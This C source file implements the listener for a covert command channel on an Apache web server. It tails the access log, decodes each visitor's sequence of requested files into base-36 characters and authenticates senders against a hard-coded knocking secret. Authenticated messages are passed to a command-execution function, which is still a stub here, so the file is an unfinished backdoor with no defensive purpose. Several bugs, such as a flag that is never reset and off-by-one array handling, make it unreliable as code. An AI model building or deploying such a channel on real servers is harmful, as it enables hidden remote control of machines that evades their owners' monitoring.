/*
Author: Caio Lüders aka "g3ol4d0"
contact: g3ol4d0[at]gmail[dot]com
    Copyright (C) 2013 wtf authors,
    
    This file is part of wtf
    
    wtf is free software: you can redistribute it and/or modify
    it under the terms of the GNU Lesser General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    wtf is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Lesser General Public License for more details.
    You should have received a copy of the GNU Lesser General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 */

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/inotify.h>

#define MAX_EVENTS 256
#define BASE_MAX 36 // 36 is the base-n maximum, because of strtol :P
#define E_SIZE (sizeof (struct inotify_event))
#define BUF_LENGTH MAX_EVENTS*(E_SIZE+PATH_MAX)

typedef struct decodeSingle { // struct to store a buffer for each IP that connects
	char buffer[1024] ;
	int bufLen ;
	int auth ; // auth flag
	char *ip ;
} decodeSingle ;

// configs, edit this if needed
static char accessLogPath[] = "/var/log/apache2/access.log" ;
static char serverPath[] = "/var/www/html/" ;
static char knockingSecret[] = "4ll1g4t0r5uX" ; // secret for the auth process
static char baseCharSet[] = "0123456789abcdefghijklmnopqrstuvwxyz" ; // 36 from strtol comes from here

// globals
char * baseDict[BASE_MAX] ; // array to map each file to a value
int n = 0 ; // which base it will be
decodeSingle decodeBuffer[1024] ; // buffer for decoding the messages. The message should end in 0x0a
int iBuffer = 0 ; // lazyness


static int cmp(const void *p1, const void *p2){
	return strcmp(* (char * const *) p1, * (char * const *) p2);
}

void execute_message( char * message ) {
	printf("tem calma carai\n");
}

void parse_log( char * lastLine ) {
	int flag = 0 ; // is the IP known ?
	int i, nth ;
	char * path ; 
	char * file ;
	char * pathClean ;

	path = strtok( lastLine , " ") ; // the first split is the IP

	// search for the ip in the table
	for ( nth = 0 ; nth < iBuffer ; nth++ ) {
		if ( strcmp( path , decodeBuffer[nth].ip ) == 0 ) {
			flag = 1 ;
			break ;
		}
	}

	if ( !flag ) {
		decodeBuffer[iBuffer].ip = path ; // add ip if not found
		decodeBuffer[iBuffer].bufLen = 0 ;
		decodeBuffer[iBuffer].auth = 0 ;
		iBuffer += 1 ;
	}

	for ( i = 0 ; i < 6 ; i++ ) { // the path resides in the 6th word
		path = strtok( NULL , " ") ;
	}
	
	pathClean = strtok( path, "?" ) ;

	// write the encoded data to the buffer
	for ( i = 0 ; i < n ; i++ ) {
		if ( strcmp( pathClean , baseDict[i] ) == 0 ) { 
			decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] = baseCharSet[i] ;
			decodeBuffer[nth].bufLen += 1 ;
			break ;
		}
	}

	// debug
	for ( i = 0 ; i < decodeBuffer[nth].bufLen ; i++ ) {
		printf("%c", decodeBuffer[nth].buffer[i] );
	}
	printf("\n");

	char *temp ;
	char *last2Buffer ;
	last2Buffer = &decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen-2] ; 	

	// check is the end of the message
	if ( strtol( last2Buffer , &temp , n ) == 10 ) { // 10 == 0x0a
		if ( decodeBuffer[nth].auth == 1 ) {
			execute_message( decodeBuffer[nth].buffer ) ;
		} else if ( strcmp( decodeBuffer[nth].buffer , knockingSecret ) == 0 ) {
			decodeBuffer[nth].auth = 1 ;
		}
	}
}

void read_log_lastline() {
	FILE *f ;
	char c ;
	int len = 0 ;
	char line[1024] = "" ;

	f = fopen( accessLogPath , "r" ) ;
	
	if ( f == NULL ) perror("reading log") ;
	
	fseek( f , -1 , SEEK_END ) ;

	c = fgetc(f) ;

	// getting the last line of the log
	while ( c == '\n') {
		fseek( f , -2 , SEEK_CUR ) ;
		c = fgetc(f) ;
	}

	while ( c != '\n' ) {
		fseek( f , -2 , SEEK_CUR ) ;
		++len ;
		c = fgetc(f) ;
	}

	fseek( f , 1 , SEEK_CUR );

	if ( fgets( line , len , f) != NULL )
		parse_log(line) ;

	fclose(f);
}

int add_watch(int fd,char *name,uint32_t mask){
    int wd;

    if((wd=inotify_add_watch(fd,name,mask))==-1)
	perror("Failed to watch directory");

    return wd;
}

void handle_event(int fd,char *buf){
    size_t idx=0,length=read(fd,buf,BUF_LENGTH);
    struct inotify_event *event;

    if(length<0) perror("read");

    while(idx<length){
		event=(struct inotify_event*) &buf[idx];

		if(event->mask&IN_MODIFY) { // IN_MODIFY could lead to error
			read_log_lastline();
		}
		idx+=E_SIZE+event->len;
    }
}

// from https://stackoverflow.com/questions/8436841/how-to-recursively-list-directories-in-c-on-linux
void mount_base_table( const char *name ) {
	DIR *dir;
    struct dirent *entry;
	int i , f = 0 ;
	char* index_files[] = {"index.html","index.htm","index.php","welcome.html","robots.txt"}; // add more to fit your needs 

    if (!(dir = opendir(name)))
		return;

    while ((entry = readdir(dir)) != NULL) {
		if ( n >= BASE_MAX )
			break ;
		if (entry->d_type == DT_DIR) {
			char path[1024];
			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
				continue;
			snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
			mount_base_table(path);
		} else {
			char path[1024];
			for ( i = 0 ; i < sizeof(index_files)/sizeof(index_files[0]) ; i++ ) {
				if ( !strcmp(index_files[i] , entry->d_name ) ) 
					f = 1 ;
			}
			if (!f) {
				snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
				strcpy(baseDict[n],path+strlen(serverPath)) ;
				n += 1 ;
			}
		}
    }

    closedir(dir);   
}

int main() {
	int in , watch, i ;
	char buffer[BUF_LENGTH];

	for ( i = 0 ; i < BASE_MAX ; i++ ) {
		baseDict[i] = malloc(1024*sizeof(char)) ;
	}

	mount_base_table(serverPath) ; 
	
	qsort( baseDict , n-1 , sizeof(char *) , cmp ) ; // sorting the array , because readir does not grants it

	for ( i = 0 ; i <= n ; i++ ) {
		printf("%d --> %s\n", i , baseDict[i]) ;
	}

	printf("%d\n",n);

	in = inotify_init() ;

	if ( in < 0 )
		perror( "inotify_init" ) ;

	watch = add_watch( in , accessLogPath , IN_MODIFY ) ;

	// Always check if the log file has changed
	while(1) handle_event( in , buffer ) ;


	// remove inotify
	(void) inotify_rm_watch( in , watch ) ;
	(void) close( in ) ;

	return 0 ;
}
